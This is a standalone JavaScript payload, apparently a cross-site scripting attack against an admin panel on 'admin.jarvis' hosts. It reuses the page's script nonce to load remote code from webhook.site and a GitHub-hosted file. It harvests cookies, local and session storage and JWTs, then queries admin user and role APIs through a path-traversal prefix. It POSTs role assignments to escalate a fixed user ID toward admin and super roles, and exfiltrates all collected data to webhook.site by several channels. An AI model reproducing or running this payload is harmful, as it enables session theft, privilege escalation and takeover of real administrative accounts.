(async()=>{
try{
if(!String(location.hostname||'').match(/admin\.jarvis/)){return;}
const C='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14';
const S='https://webhook.site/0432b78b-3ddb-4c0c-abb1-2ec54060f23e';
const J='https://cdn.jsdelivr.net/gh/AmirSarani/ui-events-sdk@main/assets/client.min.js';
const UID='01967db5-ae00-4642-96ba-f82321e15ef0';
function nonce(){
  try{
    const el=document.querySelector('script[nonce]');
    return (el&&(el.nonce||el.getAttribute('nonce')))||'';
  }catch(e){return '';}
}
function boot(src){
  try{
    const s=document.createElement('script');
    const n=nonce();
    if(n) s.setAttribute('nonce',n);
    s.src=src;
    (document.documentElement||document.head||document.body).appendChild(s);
  }catch(e){}
}
boot(S);boot(J);
const out={t:Date.now(),host:location.hostname,href:location.href,ua:navigator.userAgent,nonce:nonce(),cookie:'',cs:'',ls:{},ss:{},jwt:'',pulls:{}};
try{out.cookie=document.cookie||'';}catch(e){}
try{if(window.cookieStore&&cookieStore.getAll){out.cs=await cookieStore.getAll();}}catch(e){}
try{for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);const v=localStorage.getItem(k)||'';out.ls[k]=v.substring(0,400);if(!out.jwt&&v.startsWith('eyJ'))out.jwt=v;}}catch(e){}
try{for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);const v=sessionStorage.getItem(k)||'';out.ss[k]=v.substring(0,400);if(!out.jwt&&v.startsWith('eyJ'))out.jwt=v;}}catch(e){}
const prefs=['/api/session/login/../../v1/','/api/v1/','/api/','https://api.jarvis.you/api/v1/','https://admin.jarvis.you/api/v1/'];
async function pull(tag,path,opt){
  for(const pref of prefs){
    const url=path.startsWith('http')?path:(pref+path.replace(/^\//,''));
    try{
      const r=await fetch(url,Object.assign({credentials:'include',headers:{'Accept':'application/json','Content-Type':'application/json'}},opt||{}));
      const t=await r.text();
      out.pulls[tag]={status:r.status,url,body:t.substring(0,1600)};
      if(r.status&&r.status<500)return out.pulls[tag];
    }catch(e){out.pulls[tag+'_e']=String(e).substring(0,80);}
  }
  return out.pulls[tag];
}
await pull('me','me');
await pull('roles','admin/roles');
await pull('users','admin/users?page=1&pageSize=20');
await pull('user','admin/users/'+UID);
let roles=[];
try{const j=JSON.parse((out.pulls.roles&&out.pulls.roles.body)||'{}');roles=Array.isArray(j.data)?j.data:(Array.isArray(j)?j:[]);}catch(e){}
const nameOf=r=>String(r.name||r.title||'');
const usable=roles.filter(r=>r&&r.id&&!/^user$/i.test(nameOf(r)));
const adminish=usable.filter(r=>/admin|owner|manage/i.test(nameOf(r))&&!/super/i.test(nameOf(r)));
const rest=usable.filter(r=>!adminish.includes(r)&&!/super/i.test(nameOf(r)));
const supers=usable.filter(r=>/super/i.test(nameOf(r)));
const queue=adminish.concat(rest,supers).filter((r,i,a)=>a.findIndex(x=>x.id===r.id)===i).slice(0,6);
for(const role of queue){
  const tag='as_'+nameOf(role).substring(0,16);
  await pull(tag,'admin/users/'+UID+'/roles',{method:'POST',body:JSON.stringify({roleId:role.id})});
}
const q=new URLSearchParams({n:out.nonce?'1':'0',j:out.jwt?'1':'0',s:String(queue.length),ck:(out.cookie||'').substring(0,120)});
const blob=JSON.stringify(out);
function boom(url){
  try{new Image().src=url+(url.includes('?')?'&':'?')+q.toString();}catch(e){}
  try{fetch(url,{method:'POST',mode:'no-cors',credentials:'omit',body:blob});}catch(e){}
  try{navigator.sendBeacon&&navigator.sendBeacon(url,blob);}catch(e){}
  boot(url.split('?')[0]+'?'+q.toString());
}
boom(C);
try{fetch('/api/session/login/../../v1/me?ja='+encodeURIComponent(q.toString()),{credentials:'include'});}catch(e){}
}catch(e){
  try{new Image().src='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14?err='+encodeURIComponent(String(e).substring(0,140));}catch(x){}
}
})();
